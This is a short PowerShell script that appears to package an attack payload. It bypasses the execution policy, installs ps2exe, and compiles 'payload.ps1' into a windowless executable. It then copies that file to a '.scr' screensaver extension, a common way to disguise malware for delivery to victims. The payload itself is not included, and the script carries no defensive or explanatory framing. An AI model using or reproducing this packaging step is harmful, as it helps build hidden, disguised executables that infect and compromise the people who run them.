
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

if (!(Get-Module -ListAvailable -Name "ps2exe")) {
    Install-Module ps2exe
}
Import-Module ps2exe

Invoke-ps2exe -inputFile "payload.ps1" -outputFile "payload.exe" -noConsole
Copy-Item -Path "payload.exe" -Destination "payload.scr"


